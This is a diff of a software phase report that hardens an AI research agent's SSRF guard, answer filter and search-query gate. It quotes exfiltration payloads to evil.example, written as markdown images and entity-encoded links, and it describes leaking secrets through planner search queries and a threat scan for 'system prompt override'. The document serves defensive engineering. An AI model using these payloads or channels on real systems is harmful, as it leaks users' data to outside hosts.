@@ -3,9 +3,9 @@
 **Phase:** PROJECTOS-PORT-RESEARCH1A, phase 11 of `docs/changes/delta_spec_V4_PORTS.md`, plan v1.36 (active), delta row 5.
 **Branch:** `projectos-port-research1a`, worktree `C:/dev/ProjectOS-worktrees/port-research1a-v136`, based on the reviewed
 providers branch plus the shared credit-directory commits. Not pushed, not merged, phase not closed, no phase record created.
-**State:** built, and the fix round for review round 1 is made (below). ECC SECURITY found no CRITICAL or HIGH, 4 MEDIUM and 4 LOW;
-the Agency application-security review blocked wiring until F1 and F2 were decided. All of them are addressed here; the ONE recheck
-is the lead's. `docs/06_Plan.md` is not edited. Full `validate-all` is the lead's and was not run here. Nothing was run from a vendor
+**State:** built, review round 1 fixed, and the FINAL fix round (review round 2) made (below). ECC SECURITY found no CRITICAL or HIGH, 4 MEDIUM and 4 LOW;
+the Agency application-security review blocked wiring until F1 and F2 were decided. All of them are addressed here. The recheck found M3 partial, M4 not fixed and two residual channels of R1; those are fixed in
+the final round, and no further review follows it: the lead re-runs everything and reproduces each input. `docs/06_Plan.md` is not edited. Full `validate-all` is the lead's and was not run here. Nothing was run from a vendor
 folder, `openbot-lower` was not opened, and no `DO-NOT-PORT.txt` was read.
 
 ## Existing code found (B1, before any code)
@@ -32,8 +32,8 @@ folder, `openbot-lower` was not opened, and no `DO-NOT-PORT.txt` was read.
 | Original, agent (3 files) | `projectos/agent/src/research/{committedPolicy,runtime,index}.ts` | under 90 |
 | Barrel | `projectos/core/src/index.ts` | one line, `export * from './research/index.js';` |
 | Notices | `THIRD_PARTY_NOTICES` | 12 entries, written by script from each file's own header |
-| Tests | `projectos/core/test/research-{url,guard,policy,content,search,loop,fixround}.test.ts`, `researchFixtures.ts`, `projectos/agent/test/research.test.ts` | 184 core, 11 agent |
-| Validator | `projectos/validators/val-projectos-port-research1a.cjs` | 40 rules, 177 text and 139 behavioural mutations, 79 probes, in both runners |
+| Tests | `projectos/core/test/research-{url,guard,policy,content,search,loop,fixround,final}.test.ts`, `researchFixtures.ts`, `projectos/agent/test/research.test.ts` | 199 core `it` blocks (19 of them new in the final round), 11 agent |
+| Validator | `projectos/validators/val-projectos-port-research1a.cjs` | 41 rules (PR-1 to PR-40 and PR-T), 205 text and 165 behavioural mutations, 87 probes, in both runners |
 | Credit list | `projectos/validators/val-projectos-port-credit1a.cjs` | one word, `research`, added to `PORT_VALIDATORS` (see L7) |
 
 27 source files, 3111 lines, none over 330. No new dependency: `package.json` of both packages is pinned by PR-7.
@@ -92,6 +92,35 @@ ledger that outlives a run, and this phase does not build one. What it does: the
 port, asks it before every query, and sends nothing unless it answers exactly `true`; the planner's price is asked of `grant` before
 every call; and a run's budget cannot exceed two dollars whatever its request says. A later phase supplies the ledger.
 
+## Review round 2 and the final fix round
+
+The recheck (a read-only reviewer that reproduced) found H1, H2, M1, M2 and L1 to L7 FIXED, and left M3 partial, M4 not fixed and two
+residual channels of R1. The builder of the final round was cut off by a usage limit after a WIP commit (`67d4d527`, unbuilt and
+unverified); this round built it, ran its test (18 of 18 green: the WIP was right) and added what was missing. The failing test came
+first for every item: `core/test/research-final.test.ts`. Each fix has a named validator mutation (text and behavioural) that is
+killed by its own rule; the validator's own output, not this table, is the evidence (`PASS ... 205 text and 165 behavioural mutations killed`,
+which is 28 and 26 more than before the round).
+
+| # | Finding | Fix | Test | Rule and mutations (each killed by its own rule) |
+|---|---|---|---|---|
+| M3 (a) | `granted()` in `searchBudget.ts` was not timed: a hung grant hung `runResearch` forever | The grant is asked through the injected timer (`grantMs`, 5 s, lowered by the run's deadline). A timeout is `TIMEOUT`, which is a refusal; nothing is reserved and the provider or planner is never called | *M3 (a)*: a hung grant for a paid search, for the planner, and a grant that answers, throws or is slow but in time | PR-37: `a-grant-that-is-slow-is-a-refusal-of-another-kind` |
+| M3 (b) | A timer answering `{done:true}` with no value made `runResearch` throw a TypeError | `callWithin` takes `done:true` with no `value` for an error; the loop and `searchRuntime` also check the SHAPE of what a call returned (an object with `action` / `answer`); anything else is a refusal (`PLANNER_FAILED`, `SEARCH_FAILED`), never a throw | *M3 (b)*: `{done:true}` and `{done:true,value:5}` for the run and for a search | PR-37: `a-value-less-answer-is-a-value`, `a-planner-answer-shape-is-not-checked`, `a-search-answer-shape-is-not-checked` |
+| M3 (c) | The deadline was only checked between steps: one fetch could wait about 160 s (6 hops x 27 s) past a 120 s deadline | `fetchGuarded` has a TOTAL budget over all its hops (`fetchTotalMs`, 60 s by default) read from the injected clock; each wait is the smaller of its own limit and what is left, and a spent total is `TIMEOUT`. The loop gives its fetch the run's remaining time minus `DEADLINE_MARGIN_MS` (1 s). **The lookups are subtracted too** (found while checking the finished work: the WIP gave the port the time left BEFORE the lookups): the two DNS waits of a hop get half of what is left each, and what is left is read AGAIN before the port is called | *M3 (c)*: a fake timer and a virtual clock, 5 s per hop; a run with a 12 s deadline; slow lookups (new); an ordinary redirect still followed | PR-37: `the-total-fetch-budget-goes`, `a-hop-ignores-the-total`, `a-lookup-ignores-the-total`, `the-loop-gives-the-fetch-the-whole-deadline`, `the-lookups-are-not-subtracted`, `the-two-lookups-each-get-the-whole-total`, `the-port-is-called-with-no-time-left` |
+| M4 | The answer filter passed `![x][1]\n[1]: //evil.example/a?d=S`, `[1]: https&#58;//evil.example/?d=S`, `<<b>img src=//evil.example/?d=S>` and a bare `evil.example/x?d=S`; it also damaged `Map<String, Integer>` and `Input data: 5` | `answerFilter.ts` now **decodes entities first** (named, decimal, hexadecimal, and again per layer), **runs to a fixpoint** (`MAX_FILTER_PASSES` 8; text still changing at the cap is NOT returned: `stable:false`, and `runResearch` refuses the answer and tells the planner `answer-unfilterable`), removes reference definitions and reference-style images and links, scheme-relative `//host.tld/...`, bare `host.tld/path?...` (kept only when it is a cited source's own address), and `javascript:` / `data:` / `vbscript:` followed by a letter or a slash; HTML is removed by an **allow-list of real tag names**, so a type argument and an inequality stay. Every pattern is bounded | *M4*: the reviewer's inputs and 9 more, a nesting depth of 12 refused as unstable, 13 harmless texts left byte for byte, a cited source kept, hostile input under 1.5 s, the loop's refusal | PR-39: `one-pass-is-enough`, `entities-are-not-decoded-first`, `reference-definitions-stay`, `reference-links-stay`, `scheme-relative-addresses-stay`, `bare-addresses-stay`, `script-schemes-stay`, `every-angle-bracket-name-is-a-tag`, `a-type-argument-is-a-tag`, `an-unstable-answer-is-returned` |
+| R1 (a) | In allow-list mode any path on a named host passed | An unlisted address on a named host is refused (`not-listed`) when its path is longer than `MAX_ALLOW_LIST_PATH_CHARS` (64), as well as when it has a query or a fragment; a long path the run listed verbatim is still fetchable | *R1 (a)*: a long path refused, a short one fetched, a listed long one fetched | PR-33: `a-long-allow-list-path-is-fetched` |
+| R1 (b) | The planner-chosen SEARCH QUERY was an outbound string with no gate | `queryProvenanceProblem`: refused when longer than `MAX_PLANNER_QUERY_CHARS` (200), when it holds an address (scheme, `www.`, a bare `host.tld/...`, an `@`), when it holds a run of `MIN_ENCODED_RUN_CHARS` (32) or more base64, hex or base32 characters, or when it quotes `MAX_QUERY_QUOTE_CHARS` (40) or more characters of a page the run fetched (case and white space folded). The **audit list** gets the precise reason (`query-too-long`, `query-has-address`, `query-has-encoded-data`, `query-quotes-a-page`); the **planner** is told only `search refused: QUERY_REFUSED/not-sendable`. A refused query reaches no provider and is charged nothing | *R1 (b)*: eight attempts with their exact audit reasons and the one neutral note; ordinary queries and a short quote pass | PR-40 (new): `a-long-search-query-is-sent`, `an-address-in-a-query-is-sent`, `encoded-data-in-a-query-is-sent`, `a-page-quote-in-a-query-is-sent`, `the-query-gate-is-skipped`, `the-planner-is-told-the-exact-query-reason` |
+
+One existing mutation, `a-name-is-resolved-once` (PR-16), now also fires PR-37, because the new lookup probe counts the two lookups; it
+says so (`also`), as the neighbouring mutations do.
+
+**Named residuals the lead asked to keep, not fixed here:** the threat scan dropping a legitimate result (a title that says "system
+prompt override"); the host cap counting a failed fetch (the safe side); percent-encoded instructions in the query of a kept URL.
+
+**What the answer filter is, and is not.** It is DEFENCE IN DEPTH and it is **not sufficient on its own.** The UI must render a research
+answer as PLAIN TEXT: shown as text, never parsed as markdown or HTML, never turned into a link, never allowed to load an image, a
+frame or a style. No filter can be proved to recognise every spelling of an address. This is stated in the module header and again
+under the residuals. One visible change: entities are decoded, so `&amp;` is shown as `&`.
+
 ## What is refused, and with what code
 
 Every refusal is a closed code, and a URL refusal also carries a closed reason. A refusal never carries page text, a URL's userinfo or
@@ -120,8 +149,10 @@ its query: `core/test/research-guard.test.ts` pins that `hunter2` and `?token=ab
 - **Money.** A paid search without a budget (`BUDGET_REQUIRED`), without a grant that answers exactly `true` (`NO_GRANT`, and a grant
   that throws is not a grant), or past the room that is left (`OVER_BUDGET`), all before the provider is called; the same for a priced
   planner; Brave without a ledger.
+- **Search queries.** Over 200 characters, with an address or an `@`, with a long encoded run, or quoting a fetched page (`QUERY_REFUSED`; exact reason in the audit, `not-sendable` to the planner).
+- **Time.** A spend grant, a resolver, a port, a provider or a planner that does not answer in time (`TIMEOUT`); all the hops of one fetch together past `fetchTotalMs`; a timer or a call that answers with the wrong shape is a refusal, never a throw.
 - **Answers.** No citation, a citation of a page that was not fetched, of lines it does not have, or an answer that is malformed.
-  The citation's project is the run's, whatever the planner wrote.
+  The citation's project is the run's, whatever the planner wrote. An answer the filter cannot make stable is refused (`answer-unfilterable`).
 
 ## Acceptance criteria to evidence
 
@@ -133,11 +164,11 @@ its query: `core/test/research-guard.test.ts` pins that `hunter2` and `?token=ab
 | A paid search provider call without a budget is refused | `research-search.test.ts`, `research-loop.test.ts`, and *M3* for the planner and the ceiling. PR-9, PR-10, PR-11, PR-38 |
 | Credit header and notices entry on every ported file; credit validator passes | 11 ported files, 12 entries; `val-projectos-port-credit1a` PASS. PR-2, PR-3, PR-4 |
 | The validator refuses any importer outside the module | PR-30: the tracked-file scan allows exactly the core barrel line. `an-importer-appears` is killed |
-| Validator pin and named mutations, each killed by its own rule | 177 text and 139 behavioural mutations, below |
+| Validator pin and named mutations, each killed by its own rule | 205 text and 165 behavioural mutations, below |
 
 ## The validator and its mutations
 
-`val-projectos-port-research1a.cjs`: 40 rules (PR-1 to PR-39 and PR-T), 79 behavioural probes, 191 pinned test names. Every pin is
+`val-projectos-port-research1a.cjs`: 41 rules (PR-1 to PR-40 and PR-T), 87 behavioural probes, 210 pinned test names. Every pin is
 taken from inside the function that decides, after comments are stripped. The code also runs: `behaviour` copies this phase's
 TypeScript and the kernel files it imports into a scratch directory, and Node's type stripping runs it against fakes. The unmutated copy
 must pass every probe, and a mutation counts only when exactly the rules it names fail. Seven rules are new in the fix round
@@ -147,7 +178,7 @@ and the cache read. A behavioural mutation that makes **every** fetch fail (the 
 the connected-address check it can no longer be told apart by rule; its text mutation stays.
 
 ```text
-val-projectos-port-research1a: PASS (27 real files judged; 177 text and 139 behavioural mutations killed)
+val-projectos-port-research1a: PASS (27 real files judged; 205 text and 165 behavioural mutations killed)
 val-projectos-port-credit1a: PASS (103 real file(s) judged; 157 fixture and 59 record mutations killed)
 ```
 
@@ -155,15 +186,15 @@ val-projectos-port-credit1a: PASS (103 real file(s) judged; 157 fixture and 59 r
 
 | Check | Result |
 |---|---|
-| `core`: `npx vitest run` | exit 0, 71 files, **3177 tests passed**, of which 184 are this phase's |
-| `core`: `npm run -s build` | exit 0 |
-| `core`: `tsc -p tsconfig.json --noEmit` | exit 0 with `strict`, `noUncheckedIndexedAccess` and `exactOptionalPropertyTypes` |
-| `agent`: tests | `agent/test/research.test.ts`, **11 of 11 passed, through an alias config** (below) |
-| `agent`: typecheck | `tsc` over `agent/src/research` and `agent/test/research.test.ts`, exit 0, **through the same alias** |
-| `val-projectos-port-research1a` | PASS, above |
+| `core`: `npx vitest run` | exit 0, 72 files, **3196 tests passed** (final round, after the last source edit), of which 199 are this phase's |
+| `core`: `npm run -s build` | exit 0 (repeated after the last source edit) |
+| `core`: `tsc -p tsconfig.json --noEmit` | exit 0 with `strict`, `noUncheckedIndexedAccess` and `exactOptionalPropertyTypes` (final round) |
+| `agent`: tests | `agent/test/research.test.ts`, **11 of 11 passed, through an ALIAS config** (below). A whole-directory agent run was also made once: 3436 passed, 10 skipped, 1 file failed, `test/tenantSidecar.test.ts` at its 170 s timeout while 12 validators ran in parallel; it does not touch this module and was not re-run in isolation |
+| `agent`: typecheck | `tsc` over `agent/src` and `agent/test` through an alias `tsconfig` (`paths` for `@projectos/core` to this worktree's `core/dist/index.d.ts`), exit 0 |
+| `val-projectos-port-research1a` | PASS, 205 text and 165 behavioural mutations killed, each by its own rule (read from the validator's output; it fails when one survives or fires a rule it did not name) |
 | `val-projectos-port-credit1a` | PASS, above |
 | `validate-no-secrets` | PASS |
-| Every validator that reads a touched file | 29 validators found by searching `projectos/validators` and `projectos/speed` for the touched paths (`THIRD_PARTY_NOTICES`, `core/src/index.ts`, `validate-all.cjs`, `cached-runner.cjs`, the credit validator, the test directories), each in its own process, **all exit 0**: the six sibling port validators (search 113+25, memory 197, skills, context 320, approvals, providers 221+89), connector-contract (293), tenant-* and the validator-scratch-lifecycle check, and `validate-no-secrets`. That run was made before two comment-only header edits and one extractor shortcut; after them this phase's own validator, the credit validator, `validate-no-secrets`, core `vitest` (exit 0, 3177 tests), build and the agent alias run were repeated, and no other validator reads those files |
+| Every validator that reads a touched file | A search of `projectos/validators` and `projectos/speed` for the touched paths finds only this phase's validator, the credit validator and the two registration files, and the validators that walk `core/src` were run as well: cd-b4-repository-baseline-adapter1a, agent-workforce1a, host-review-path1a, live-gate-owner-floor1a, port-approvals1a (83 scenarios), port-providers1a (221+89), port-search1a (113+25), technical-continuation1a, tenant-csp1a (106), worker-lifecycle-bounded1a, watchdog-core1a and validate-zero-relay-continuity, plus `val-projectos-port-credit1a` (PASS) and `validate-no-secrets` (PASS). Each in its own process, **all exit 0, and run AFTER the last source edit**. The earlier 29-validator run of round 1 was not repeated in full |
 
 **Running the agent test.** `agent/node_modules/@projectos/core` is a junction to another worktree, so plain `npx vitest` cannot see
 this phase's core. The test and the typecheck ran with scratchpad configs aliasing `@projectos/core` to this worktree's
@@ -199,7 +230,7 @@ strict: the new tests ran red first (39 of 43), then the code.
 |---|---|
 | SSRF guard and website policy | `addressClass`, `hostNames`, `urlParse`, `ssrfGuard`, `websitePolicy`: fail-closed, with the connected address checked, an allow-list mode and every wait bounded |
 | Readability extraction | A small in-repo tag scanner, **not** Mozilla Readability, now linear. A better extractor is one injected `WebContentExtractor` away |
-| Step-capped research loop, cited answers only, reusing `admitCitedAnswer` | `researchLoop.ts`; fetches held to the run's own addresses; the answer filtered |
+| Step-capped research loop, cited answers only, reusing `admitCitedAnswer` | `researchLoop.ts`; fetches held to the run's own addresses; the search query gated; every wait bounded, including the grant and all the hops of a fetch together; the answer filtered to a fixpoint, and an unstable answer refused |
 | Fetched content untrusted and threat-scanned with the memory scan | Pages, titles, addresses, every search result and the evidence header |
 | SearXNG and Brave behind an injected fetch, fakes only | `searxng.ts`, `brave.ts`; no live call in any test |
 | Paid search counts against the budget (P3) | `searchBudget.ts`: budget, grant, room, reserved before the call; the planner is charged too; a hard ceiling; Brave needs a ledger |
@@ -228,7 +259,11 @@ phase); no live port.
   run can reach; a hostile provider can still steer a run to a host of its choice, once screened.
 - **Allow-list mode is only as good as the list.** A named host is allowed exactly, with no query; a subdomain is not.
 - **Hidden text styled by a style sheet or a class is extracted** (L6 above).
-- **The answer filter is a second line.** The UI must show the answer as plain text; a client that renders markdown would show any address
+- **The answer filter is DEFENCE IN DEPTH and is not sufficient on its own.** It decodes entities, runs to a fixpoint, removes reference definitions, scheme-relative and bare addresses and script schemes, and refuses text it cannot make stable, but no filter can be proved to recognise every spelling. **The UI must render a research answer as PLAIN TEXT**: never parsed as markdown or HTML, never linked, never allowed to load an image, a frame or a style. A client that renders markdown is exposed to whatever the filter misses.
+- **Final-round residuals, kept on purpose.** The threat scan drops a legitimate result whose title says, for example, "system prompt override". The host cap counts a failed fetch (the safe side). Percent-encoded instructions in the query of a kept URL are not decoded.
+- **The search-query gate is a heuristic.** A planner can still send a question that is itself a message (a few short words chosen to carry a secret, spread over several queries): the caps (200 characters, 40-character quote, 32-character encoded run, no address, no `@`) bound what one query carries, and the run is step-capped, but a determined planner with a conspiring provider is not ruled out. Every refused query is in the audit list with its exact reason.
+- **An allow-list host still sees up to 64 characters of path** on an address the run did not list, and the path of a listed one in full.
+- **The total fetch budget is read from the injected clock, so it is as honest as the clock** (a broken clock is `BAD_CLOCK`, a refusal). A port that ignores its signal can still outlast it; the guard stops waiting and releases the slot.
   that survives, and the only survivors are the run's own cited sources.
 - **The extractor is small.** Pages that hold their text in script, or whose only content sits in `nav`/`aside`/`footer`, yield nothing
   and are refused as having no readable text.
@@ -242,7 +277,7 @@ phase); no live port.
 - **The behavioural copy is not the build.** It runs under type stripping with imports rewritten, so `tsc` and the suites cover the real
   build.
 - **`CommittedRead` is declared twice** and the internal-suffix list overlaps the broker's (see "Existing code found").
-- **The validator is 2,400 lines**, against its siblings' 1,100 to 1,730 and the 800-line source rule, which it does not apply to. It is
+- **The validator is about 2,600 lines**, against its siblings' 1,100 to 1,730 and the 800-line source rule, which it does not apply to. It is
   data and probes, not logic.
 - **No robots.txt handling.**
 
@@ -250,4 +285,6 @@ phase); no live port.
 
 - `b430882a` feat(port): cited research with an SSRF guard, readable text and a step-capped loop
 - `dd990e06` docs(finish): PROJECTOS-PORT-RESEARCH1A evidence
-- The fix-round commit `fix(port): …`, which carries this version of the file.
+- `46a2296b` fix(port): answer review round 1 on cited research
+- `67d4d527` wip(port): the final round, interrupted by a usage limit; built, tested and kept
+- The final fix-round commit `fix(port): …`, which carries this version of the file.
